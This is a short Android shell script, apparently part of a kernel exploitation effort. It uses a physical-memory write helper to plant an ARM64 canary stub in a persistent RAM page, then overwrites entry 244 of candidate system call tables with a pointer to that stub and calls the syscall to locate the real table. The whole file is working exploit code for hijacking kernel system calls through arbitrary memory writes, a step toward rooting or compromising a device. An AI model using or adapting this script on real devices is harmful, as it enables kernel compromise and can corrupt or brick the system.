#!/system/bin/sh
# SAFE scan for sys_call_table[244]:
# 1) write canary payload (movz x0,#0x1234; ret) to persistent_ram page (phys 0x07300000)
# 2) for each candidate page, write POINTER to that page into cand+0x7a0 (slot 244)
# 3) call syscall(244); hit if return == 0x1234
GAW=/data/local/tmp/gaw64
KF=/data/local/tmp/kfunc_new
CAN=0xd65f03c0d2824680
PAGE=0xffffffc007300000
start=$1
end=$2
# step 1: canary in safe page
$GAW 0x7300000 $CAN >/dev/null 2>&1 || { echo "canary write failed"; exit 1; }
c=$start
while [ $((c)) -le $((end)) ]; do
  target=$((c + 0x7a0))
  $GAW $(printf '0x%x' $target) $PAGE >/dev/null 2>&1
  r=$($KF call 244 2>/dev/null | sed -n 's/.*ret=0x//p')
  if [ "$r" = "1234" ]; then
    echo "HIT SLOT_PHYS table=$(printf '0x%x' $c) slot=$(printf '0x%x' $target)"
    exit 0
  fi
  c=$((c + 0x1000))
done
echo "NOT FOUND"
